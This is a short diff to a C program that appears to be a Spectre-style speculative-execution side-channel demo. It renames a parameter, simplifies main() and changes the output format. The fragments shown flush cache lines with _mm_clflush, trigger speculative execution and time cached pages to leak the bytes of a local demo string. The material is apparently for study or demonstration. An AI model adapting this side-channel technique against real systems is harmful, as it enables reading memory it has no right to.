@@ -70,7 +70,7 @@ void detect_cached_page(int results[256])
     }
 }
 
-uint8_t probe(char* secret)
+uint8_t probe(char* target)
 {
     static int results[256];
     int tries, i, j, k, mix_i, junk = 0;
@@ -84,7 +84,7 @@ uint8_t probe(char* secret)
             _mm_clflush(mem_pages[i]);
         }
 
-        speculative_execution(secret, tries);
+        speculative_execution(target, tries);
 
         detect_cached_page(results);
     }
@@ -94,7 +94,8 @@ uint8_t probe(char* secret)
 
 char *secret = "Hello, Abu coding!";
 
-int main(int argc, const char **argv) {
+int main()
+{
     int i, score[2], len=18;
     uint8_t value[2];
 
@@ -104,7 +105,7 @@ int main(int argc, const char **argv) {
     while (--len >= 0) 
     {
         uint8_t ret = probe(secret++);
-        printf("Result: %c", ret);
-        printf("\n");
+        printf("%c ", ret);
     }
+    printf("\n");
 }
